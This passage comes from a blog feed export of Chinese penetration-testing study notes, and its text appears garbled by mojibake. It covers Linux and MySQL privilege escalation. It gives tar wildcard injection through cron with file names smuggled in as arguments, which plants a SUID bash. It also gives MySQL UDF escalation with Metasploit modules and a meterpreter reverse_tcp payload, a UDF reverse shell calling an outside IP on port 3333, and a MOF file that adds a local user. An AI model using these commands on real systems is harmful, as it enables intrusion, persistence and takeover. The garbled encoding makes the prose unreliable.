class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">åœ¨ç›¸å…³å‘½ä»¤ä¸‹æ‰§è¡Œç›®å½•ã€‚åˆ©ç”¨è®¡åˆ’ä»»åŠ¡çš„å¤‡ä»½åŠŸèƒ½tarå‘½ä»¤çš„å‚æ•°åˆ©ç”¨<br><br>tar  czf  /tmp/backup.tar.gz *<br><br>tar  czf /tmp/backup.tar.gz *<br>tar  czf /tmp/backup.tar.gz aaa.sh<br>tar  czf /tmp/backup.tar.gz abc.txt<br>.......<br>tar  czf /tmp/backup.tar.gz --checkpoint=<span class="hljs-number">1</span><br>tar  czf /tmp/backup.tar.gz -checkpoint-action=exec=sh test.sh<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span><span class="hljs-comment">#ä»¥å‘½ä»¤å‚æ•°å‘½åçš„æ–‡ä»¶  </span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; --checkpoint=<span class="hljs-number">1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; test.sh<br><br><br>chmod +x test.sh<br><br>==ã€‹ç­‰å¾…å®šæ—¶ä»»åŠ¡è¢«æ‰§è¡Œ<br>è¿è¡Œ ./bash -<span class="hljs-title function_ invoke__">p</span>   (åˆ°è¿™ç›¸å½“äºç”¨SUIDææƒ)<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230505164706431.png" alt="image-20230505164706431"></p><h3 id="å®šæ—¶ä»»åŠ¡-æ–‡ä»¶æƒé™"><a href="#å®šæ—¶ä»»åŠ¡-æ–‡ä»¶æƒé™" class="headerlink" title="å®šæ—¶ä»»åŠ¡&amp;æ–‡ä»¶æƒé™"></a>å®šæ—¶ä»»åŠ¡&amp;æ–‡ä»¶æƒé™</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">åŒæ ·ä»¥ä¸Šé¢è¿™ä¸ªå®šæ—¶ä»»åŠ¡ä¸ºä¾‹å­<br>å‡å¦‚ï¼Œrootç”¨æˆ·ç»™è¿™ä¸ªè„šæœ¬èµ‹æƒçš„æ—¶å€™ ç”¨çš„<span class="hljs-number">777</span> æˆ–è€… <span class="hljs-number">775</span> èµ‹æƒ<br>é‚£ä¹ˆæˆ‘ä»¬ä½é…ç”¨æˆ·ã€‚å°±æœ‰ä¿®æ”¹è¿™ä¸ªè„šæœ¬çš„æƒé™<br><br>å¯ä¿®æ”¹ä¸ºåå¼¹å‘½ä»¤<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230505170751181.png" alt="image-20230505170751181"></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„ç¬¬ä¸€ç¯‡ç½‘ç»œå®‰å…¨æ–‡ç« </title>
    <link href="/2021/10/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0/"/>
    <url>/2021/10/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ç« æ ‡é¢˜"><a href="#æ–‡ç« æ ‡é¢˜" class="headerlink" title="æ–‡ç« æ ‡é¢˜"></a>æ–‡ç« æ ‡é¢˜</h1><p>è¿™æ˜¯æˆ‘çš„ç¬¬ä¸€ç¯‡åšå®¢å†…å®¹ï¼Œä»‹ç»ç½‘ç»œå®‰å…¨çš„åŸºç¡€çŸ¥è¯†â€¦</p><h2 id="å­æ ‡é¢˜"><a href="#å­æ ‡é¢˜" class="headerlink" title="å­æ ‡é¢˜"></a>å­æ ‡é¢˜</h2><p>è¯¦ç»†å†…å®¹â€¦</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œå®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>å®‰å…¨æŠ€æœ¯</tag>
      
      <tag>å­¦ä¹ ç¬”è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æƒé™æå‡_æ•°æ®åº“ï¼ˆæ€»ï¼‰</title>
    <link href="/2021/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E6%80%BB%EF%BC%89/"/>
    <url>/2021/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E6%80%BB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="æƒé™æå‡-æ•°æ®åº“"><a href="#æƒé™æå‡-æ•°æ®åº“" class="headerlink" title="æƒé™æå‡_æ•°æ®åº“"></a>æƒé™æå‡_æ•°æ®åº“</h1><h2 id="ä¸€ã€MYSQL"><a href="#ä¸€ã€MYSQL" class="headerlink" title="ä¸€ã€MYSQL"></a>ä¸€ã€MYSQL</h2><h3 id="1ã€ææƒæ¡ä»¶"><a href="#1ã€ææƒæ¡ä»¶" class="headerlink" title="1ã€ææƒæ¡ä»¶"></a>1ã€ææƒæ¡ä»¶</h3><p>-æ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·çš„å¯†ç <br>-secure-file-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶</p><p>SHOW VARIABLES LIKE â€œsecure_file_privâ€;</p><p>0ã€ç½‘ç«™å­˜åœ¨é«˜æƒé™SQLæ³¨å…¥ç‚¹<br>1ã€æ•°æ®åº“çš„å­˜å‚¨æ–‡ä»¶æˆ–å¤‡ä»½æ–‡ä»¶<br>2ã€ç½‘ç«™åº”ç”¨æºç ä¸­çš„æ•°æ®åº“é…ç½®æ–‡ä»¶<br>3ã€é‡‡ç”¨å·¥å…·æˆ–è„šæœ¬çˆ†ç ´(éœ€è§£å†³å¤–è”é—®é¢˜)</p><p>è¿›åˆ°rootæ•°æ®åº“â€“ã€‹adminæƒé™</p><h3 id="2ã€è´¦å·å¯†ç è·å–"><a href="#2ã€è´¦å·å¯†ç è·å–" class="headerlink" title="2ã€è´¦å·å¯†ç è·å–"></a>2ã€è´¦å·å¯†ç è·å–</h3><h4 id="2-1ã€é€šè¿‡æ³¨å…¥ç‚¹"><a href="#2-1ã€é€šè¿‡æ³¨å…¥ç‚¹" class="headerlink" title="2.1ã€é€šè¿‡æ³¨å…¥ç‚¹"></a>2.1ã€é€šè¿‡æ³¨å…¥ç‚¹</h4><p>sqlmap.py      -D mysql -T user -C â€œpasswordâ€</p><h4 id="2-2ã€é€šè¿‡æ–‡ä»¶"><a href="#2-2ã€é€šè¿‡æ–‡ä»¶" class="headerlink" title="2.2ã€é€šè¿‡æ–‡ä»¶"></a>2.2ã€é€šè¿‡æ–‡ä»¶</h4><p><img src="/image/image-20230426102424394.png" alt="image-20230426102424394"></p><p><img src="/image/image-20230426102506705.png" alt="image-20230426102506705"></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p><img src="/image/image-20230426104638481.png" alt="image-20230426104638481"></p><h4 id="2-3ã€ç½‘ç«™é…ç½®æ–‡ä»¶"><a href="#2-3ã€ç½‘ç«™é…ç½®æ–‡ä»¶" class="headerlink" title="2.3ã€ç½‘ç«™é…ç½®æ–‡ä»¶"></a>2.3ã€ç½‘ç«™é…ç½®æ–‡ä»¶</h4><h3 id="3ã€mysqlâ€“-UDFææƒ"><a href="#3ã€mysqlâ€“-UDFææƒ" class="headerlink" title="3ã€mysqlâ€“&gt;UDFææƒ"></a>3ã€mysqlâ€“&gt;UDFææƒ</h3><p>åŸç†</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">UDFï¼ˆUserdefined <span class="hljs-keyword">function</span>ï¼‰å¯ç¿»è¯‘ä¸ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°,dllæ–‡ä»¶<br><span class="hljs-comment">---ã€‹æ•°æ®åº“æŒ‡å®šæ’ä»¶ç›®å½•</span><br><br>å…¶ä¸ºmysqlçš„ä¸€ä¸ªæ‹“å±•æ¥å£ï¼Œ<br>å¯ä»¥ä¸ºmysqlå¢æ·»ä¸€äº›å‡½æ•°ã€‚<br><br>æ¯”å¦‚mysqlä¸€äº›å‡½æ•°æ²¡æœ‰ï¼Œæˆ‘å°±ä½¿ç”¨UDFåŠ å…¥ä¸€äº›å‡½æ•°è¿›å»ï¼Œé‚£ä¹ˆæˆ‘å°±å¯ä»¥åœ¨mysqlä¸­ä½¿ç”¨è¿™ä¸ªå‡½æ•°äº†ã€‚<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨æ¡ä»¶</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-æ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·çš„å¯†ç </span><br><span class="hljs-deletion">-secure-file-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶</span><br></code></pre></td></tr></table></figure><h4 id="3-1ã€å¼€å¯å¤–è¿"><a href="#3-1ã€å¼€å¯å¤–è¿" class="headerlink" title="3.1ã€å¼€å¯å¤–è¿"></a>3.1ã€å¼€å¯å¤–è¿</h4><p>æ–¹æ³•ä¸€ï¼š</p><p>ä¿®æ”¹mysqlä¸­userè¡¨æ•°æ®</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514164652266.png" alt="image-20230514164652266"></p><p>æ–¹æ³•äºŒï¼š</p><p>æ‰§è¡Œè¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ï¼ˆï¼‰">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;å¸å·&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;å¯†ç &#x27; WITH GRANT OPTION;<br>---è¿™æ˜¯ä¸€æ¡MySQLæˆæƒè¯­å¥ï¼Œ<br>ç”¨äºæˆäºˆæŒ‡å®šç”¨æˆ·åœ¨æ‰€æœ‰æ•°æ®åº“å’Œè¡¨ä¸Šæ‹¥æœ‰æ‰€æœ‰æƒé™ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•ä¸»æœºä¸Šè¿æ¥åˆ°MySQLæœåŠ¡å™¨ã€‚<br></code></pre></td></tr></table></figure><p>æ€è€ƒ1ï¼šæœªæ‰“å¼€å¤–è¿çš„æ—¶å€™ï¼Œä¸ºä»€ä¹ˆwebshellå¯ä»¥è¿æ¥mysql</p><p>æ€è€ƒ2ï¼šlocalhost<code>å’Œ</code>::1ã€127.0.0.1ã€â€˜%â€™åŒºåˆ«æ˜¯ä»€ä¹ˆ</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">localhostéœ€è¦è¢«è§£æ<br><span class="hljs-number">127.0.0.1</span> æŒ‡ä»£æœ¬åœ°ipv4<br>::<span class="hljs-number">1</span>æŒ‡ä»£æœ¬åœ°ipv6<br>&#x27;%&#x27;æ˜¯é€šé…ç¬¦ï¼Œä»£è¡¨å¯ä»¥ä»ä»»ä½•ä¸»æœºè¿æ¥åˆ°MySQLæœåŠ¡å™¨<br></code></pre></td></tr></table></figure><h4 id="3-2ã€æŸ¥ç‰ˆæœ¬"><a href="#3-2ã€æŸ¥ç‰ˆæœ¬" class="headerlink" title="3.2ã€æŸ¥ç‰ˆæœ¬"></a>3.2ã€æŸ¥ç‰ˆæœ¬</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> version() <span class="hljs-comment">#æŸ¥ç‰ˆæœ¬</span><br><span class="hljs-keyword">select</span> @@basedir <span class="hljs-comment">#æŸ¥å®‰è£…è·¯å¾„</span><br><br>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œdllç±»å‹<br>UDFå¯¼å…¥å‡½æ•°çš„æ–‡ä»¶ä¸º,dllç±»å‹ï¼Œå…¶å­˜æ”¾çš„ç›®å½•å—ç‰ˆæœ¬å½±å“å¦‚ä¸‹ï¼š<br><br>1.mysql&lt;5.2 dllå¯¼å‡ºç›®å½•c:/windowsæˆ–system32<br>2.mysql&gt;=5.2 dllå¯¼å‡º  %å®‰è£…ç›®å½•%/lib/plugin/XXXX.DLL<br><br><br>æ²¡æœ‰ç›®å½•é‡‡ç”¨æ‰‹å·¥åˆ›å»ºpluginç›®å½•<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426110755030.png" alt="image-20230426110755030"></p><h4 id="3-3-1ã€è°ƒç”¨MSF"><a href="#3-3-1ã€è°ƒç”¨MSF" class="headerlink" title="3.3.1ã€è°ƒç”¨MSF"></a>3.3.1ã€è°ƒç”¨MSF</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ä½¿ç”¨MSFä¸­çš„exploit/multi/mysql/mysql_udf_payload æ¨¡å—å¯ä»¥è¿›è¡ŒUDFææƒ,<br><br>MSFä¼šå°†dllæ–‡ä»¶å†™å…¥lib\plugin\ç›®å½•ä¸‹(å‰ææ˜¯è¯¥ç›®å½•å­˜åœ¨ï¼Œéœ€æ‰‹å·¥åˆ›å»º),<br>è¯¥dllæ–‡ä»¶ä¸­åŒ…å«sys_exec()å’Œsys_eval()ä¸¤ä¸ªå‡½æ•°ï¼Œ<br><br><br>use exploit/multi/mysql/mysql_udf_payload<br><span class="hljs-built_in">set</span> password root<br><span class="hljs-built_in">set</span> rhosts 192.168.1.15<br><span class="hljs-built_in">run</span><br><br>æˆåŠŸç”ŸæˆDLLåï¼Œå¯åœ¨fucè¡¨ä¸‹æŸ¥è¯¢åˆ°â†“â†“â†“â†“â†“â†“â†“<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426112014088.png" alt="image-20230426112014088"></p><h4 id="3-3-2ã€å‘½ä»¤æ‰§è¡Œ"><a href="#3-3-2ã€å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="3.3.2ã€å‘½ä»¤æ‰§è¡Œ"></a>3.3.2ã€å‘½ä»¤æ‰§è¡Œ</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp">ä¸Šé¢é»˜è®¤åªåˆ›å»ºsys_exec()å‡½æ•°ï¼Œè¯¥å‡½æ•°æ‰§è¡Œå¹¶ä¸ä¼šæœ‰å›æ˜¾ã€‚<br>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨åˆ›å»º sys_eval() å‡½æ•°ï¼Œæ¥æ‰§è¡Œæœ‰å›æ˜¾çš„å‘½ä»¤<br><br><span class="hljs-comment">//1.æŸ¥çœ‹ æ˜¯å¦æœ‰â€˜sys_execâ€™</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; <span class="hljs-meta">#æŸ¥mysqlæ‰©å±•å‡½æ•°</span><br><br><span class="hljs-comment">//2.åˆ›å»ºå‡½æ•°ç»‘å®šdll</span><br>create function &lt;å‡½æ•°å&gt; returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;&lt;dllæ–‡ä»¶å&gt;&quot;</span>;<br>create function sys_eval returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;KaMeVAyW.dll&quot;</span>;<br><br>DROP FUNCTION &lt;function_name&gt; <span class="hljs-meta">#åˆ é™¤è‡ªå®šä¹‰å‡½æ•°</span><br><br><br><span class="hljs-comment">//3.è°ƒç”¨å‡½æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&quot;whoami&quot;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426112508030.png" alt="image-20230426112508030"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="4ã€mysqlâ€“-MSFå¯åŠ¨é¡¹ææƒ"><a href="#4ã€mysqlâ€“-MSFå¯åŠ¨é¡¹ææƒ" class="headerlink" title="4ã€mysqlâ€“&gt;MSFå¯åŠ¨é¡¹ææƒ"></a>4ã€mysqlâ€“&gt;MSFå¯åŠ¨é¡¹ææƒ</h3><p>åŸç†ï¼šä¸Šä¼ æœ¨é©¬åˆ°å¯åŠ¨é¡¹æ–‡ä»¶ã€‚å½“ç”µè„‘é‡å¯çš„æ—¶å€™ï¼Œå¯åŠ¨é¡¹æ–‡ä»¶è¢«è§¦å‘ã€‚å®ç°ä¸Šçº¿</p><p>4.1ã€åˆ©ç”¨æ¡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ka">å¤–è¿<br>-æ•°æ®åº“çš„æœ€é«˜æƒé™ç”¨æˆ·çš„å¯†ç <br>-secure-file-privæ²¡è¿›è¡Œç›®å½•é™åˆ¶<br></code></pre></td></tr></table></figure><p>kali â€“ã€‹ win10 phpstudy</p><p>4.2ã€ä½¿ç”¨æ¨¡å—</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>MSFï¼šï¼ˆå‰æå…ˆå¼€å¤–é“¾ï¼‰<br>use exploit/windows/mysql/mysql_start_up<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.88.131<br><span class="hljs-built_in">set</span> username root<br><span class="hljs-built_in">set</span> password root<br><span class="hljs-built_in">set</span> AllowNoCleanup  <span class="hljs-literal">true</span><br><span class="hljs-built_in">run</span><br><br>åŸç†ï¼šä¸Šä¼ æœ¨é©¬åˆ°å¯åŠ¨é¡¹ï¼Œç”µè„‘é‡å¯åè‡ªåŠ¨è¿è¡Œã€‚ä¸‹å›¾ä¸Šä¼ æˆåŠŸï¼Œåªéœ€æ‰“å¼€ç›‘å¬æ¨¡å—ç­‰å¾…ä¸Šçº¿å³å¯<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230426114415978.png" alt="image-20230426114415978"></p><p><img src="/image/image-20230426114354456.png" alt="image-20230426114354456"></p><h3 id="5ã€mysqlâ€“-MSFåå¼¹Shellï¼ˆUDFï¼‰"><a href="#5ã€mysqlâ€“-MSFåå¼¹Shellï¼ˆUDFï¼‰" class="headerlink" title="5ã€mysqlâ€“&gt;MSFåå¼¹Shellï¼ˆUDFï¼‰"></a>5ã€mysqlâ€“&gt;MSFåå¼¹Shellï¼ˆUDFï¼‰</h3><p><a href="https://blog.csdn.net/weixin_43801718/article/details/105493042">https://blog.csdn.net/weixin_43801718/article/details/105493042</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use mysql;<br><span class="hljs-keyword">set</span> @a=concat(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">----è¿™é‡Œshellå¤ªé•¿äº†ã€‚è¯¦è§ç¬”è®°shell.txt---</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> Ghost(data LONGBLOB);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> Ghost <span class="hljs-keyword">values</span>(&quot;&quot;);<span class="hljs-keyword">update</span> Ghost <span class="hljs-keyword">set data</span> = @a;<br><br><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> Ghost <span class="hljs-keyword">into</span> DUMPFILE <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>;#åˆ›å»ºæ–‡ä»¶ï¼ˆæ•°æ®ä»ä¸Šé¢åˆ›å»ºçš„è¡¨è·å–ï¼‰<br><br><span class="hljs-comment">--------------</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> backshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;  #åˆ›å»ºå‡½æ•°<br><br>æ”»å‡»æœºï¼šå¼€å¯ç›‘å¬ nc  -lvp <span class="hljs-number">3333</span><br><span class="hljs-keyword">select</span> backshell(<span class="hljs-string">&#x27;43.138.215.2&#x27;</span>,<span class="hljs-number">3333</span>)   è¿æ¥<br><br><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514175207468.png" alt="image-20230514175207468"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514175145476.png" alt="image-20230514175145476"></p><h3 id="6ã€mysqlâ€“-MOFææƒ"><a href="#6ã€mysqlâ€“-MOFææƒ" class="headerlink" title="6ã€mysqlâ€“&gt;MOFææƒ"></a>6ã€mysqlâ€“&gt;MOFææƒ</h3><h4 id="6-1ã€åŸç†-æ¡ä»¶ï¼š"><a href="#6-1ã€åŸç†-æ¡ä»¶ï¼š" class="headerlink" title="6.1ã€åŸç†&amp;æ¡ä»¶ï¼š"></a>6.1ã€åŸç†&amp;æ¡ä»¶ï¼š</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">åˆ©ç”¨äº†c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of/ç›®å½•ä¸‹çš„ nullevt.mof æ–‡ä»¶ï¼Œ<br>æ¯åˆ†é’Ÿéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡çš„ç‰¹æ€§ï¼Œå†™å…¥æˆ‘ä»¬çš„cmdå‘½ä»¤ä½¿å…¶è¢«å¸¦å…¥æ‰§è¡Œï¼Œä»è€Œæ·»åŠ æ–°ç”¨æˆ·ææƒã€‚<br><br>æµ‹è¯•çš„ä¸»æœºä¸Šè¯¥ç›®å½•ä¸‹å¹¶æ²¡æœ‰è¯¥mofæ–‡ä»¶ï¼Œ<br>å› æ­¤æˆ‘ä»¬ç›´æ¥å¯¼å…¥ä¸€ä¸ªæ–‡ä»¶ã€‚<br>å½“ç„¶è¿™é‡Œéœ€è¦æƒé™ï¼Œä¸€èˆ¬æ¥è¯´MOFæ™®é€šç”¨æˆ·æ˜¯æ— æ³•æ‰§è¡Œæ“ä½œçš„ï¼Œå³ä½¿æ˜¯æ‹¿åˆ°äº†ä¸€ä¸ªshellï¼Œ<br>ä¹Ÿåªæ˜¯æ™®é€šæƒé™ç”¨æˆ·ï¼Œåˆ©ç”¨æ¡ä»¶æœ‰äº›è‹›åˆ»ã€‚<br><br>MOFææƒçš„æ¡ä»¶è¦æ±‚ååˆ†ä¸¥è‹›ï¼š<br><span class="hljs-number">1</span>.windows <span class="hljs-number">03</span>åŠä»¥ä¸‹ç‰ˆæœ¬<br><span class="hljs-number">2</span>.mysqlæœ‰è¯»å†™ C:<span class="hljs-regexp">/Windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of çš„æƒé™<br><span class="hljs-number">3</span>.secure_file_privæ²¡è¿›è¡Œç›®å½•é™åˆ¶<br></code></pre></td></tr></table></figure><h4 id="6-2ã€ä¸Šä¼ å‡†å¤‡å¥½çš„mofæ–‡ä»¶"><a href="#6-2ã€ä¸Šä¼ å‡†å¤‡å¥½çš„mofæ–‡ä»¶" class="headerlink" title="6.2ã€ä¸Šä¼ å‡†å¤‡å¥½çš„mofæ–‡ä»¶"></a>6.2ã€ä¸Šä¼ å‡†å¤‡å¥½çš„mofæ–‡ä»¶</h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user mofmof mofmof /add\<span class="hljs-string">&quot;)&quot;</span>;<br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="6-3ã€æ‰§è¡Œè¯­å¥å¯¼å…¥mofæ–‡ä»¶"><a href="#6-3ã€æ‰§è¡Œè¯­å¥å¯¼å…¥mofæ–‡ä»¶" class="headerlink" title="6.3ã€æ‰§è¡Œè¯­å¥å¯¼å…¥mofæ–‡ä»¶"></a>6.3ã€æ‰§è¡Œè¯­å¥å¯¼å…¥mofæ–‡ä»¶</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 